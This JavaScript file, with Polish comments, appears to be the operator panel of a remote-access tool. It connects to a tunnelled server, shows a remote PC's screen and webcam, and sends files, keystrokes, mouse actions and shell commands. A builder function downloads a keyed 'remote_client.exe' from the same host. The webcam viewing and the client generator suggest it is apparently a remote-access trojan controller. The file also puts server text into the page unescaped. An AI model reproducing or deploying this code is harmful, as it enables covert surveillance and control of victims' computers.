let socket, key, exeStatusTimeout;

// Tab navigation
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.tablink').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            document.querySelectorAll('.tablink').forEach(l=>l.classList.remove('active'));
            link.classList.add('active');
            document.querySelectorAll('.tab-section').forEach(t=>t.style.display='none');
            document.getElementById(link.getAttribute('data-tab')).style.display = 'block';
        });
    });
    // Pokaż od razu pierwszą zakładkę
    document.querySelectorAll('.tab-section').forEach(s=>s.style.display='none');
    document.getElementById('controlTab').style.display='block';

    document.getElementById('loginBtn').onclick = login;
    document.getElementById('generateExeBtn').onclick = generateExe;
});

function login() {
    key = document.getElementById('keyInput').value.trim();
    if (!key) return document.getElementById('loginError').innerText = "Podaj klucz!";
    // Adres backendu przez playit.gg:
    socket = io('https://cell-membership.gl.at.ply.gg:19701', { transports: ['websocket'] });
    socket.emit('connect_with_key', {key});
    socket.on('connected_to_pc', () => {
        document.getElementById('controlSection').style.display='block';
        document.getElementById('loginError').innerText = '';
    });
    socket.on('error', msg => document.getElementById('loginError').innerText = msg);
    socket.on('screen_frame', img => document.getElementById('screenImg').src = 'data:image/jpeg;base64,'+img);
    socket.on('camera_frame', img => document.getElementById('cameraImg').src = 'data:image/jpeg;base64,'+img);
    socket.on('status', msg => showStatus(msg));
    socket.on('notify', msg => alert(msg));
}
function send(command, data={}) {
    if (!key || !socket) return;
    socket.emit('control_command', {key, command, data});
}
function getUrl() { return document.getElementById('urlInput').value; }
function getProgram() { return document.getElementById('programInput').value; }
function getFileName() { 
    let file = document.getElementById('fileInput').files[0];
    return file ? file.name : '';
}
function getFileData() {
    let file = document.getElementById('fileInput').files[0];
    if (!file) return '';
    let reader = new FileReader();
    reader.onload = function(e) { send('send_file', {filename: file.name, filedata: btoa(e.target.result)}); }
    reader.readAsBinaryString(file);
    return '';
}
function getText() { return document.getElementById('txtInput').value; }
function getX() { return +document.getElementById('xInput').value || 100; }
function getY() { return +document.getElementById('yInput').value || 100; }
function getCmd() { return document.getElementById('cmdInput').value; }
function getChat() { return document.getElementById('chatInput').value; }

function showStatus(msg) {
    document.getElementById('statusBox').innerHTML = `<b>Status:</b> ${msg}`;
    clearTimeout(exeStatusTimeout);
    exeStatusTimeout = setTimeout(()=>{document.getElementById('statusBox').innerText='';},5000);
}

// Generator .exe
function generateExe() {
    const key = document.getElementById('genKeyInput').value.trim();
    document.getElementById('exeStatus').innerHTML = "Generowanie... (może potrwać do minuty)";
    fetch('https://cell-membership.gl.at.ply.gg:19701/api/build_exe', {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({key})
    }).then(r=>r.blob()).then(blob=>{
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'remote_client.exe';
        a.click();
        document.getElementById('exeStatus').innerHTML = "Plik .exe wygenerowany! Uruchom go na swoim PC.";
    }).catch(()=>{document.getElementById('exeStatus').innerHTML = "Błąd generowania .exe.";});
}
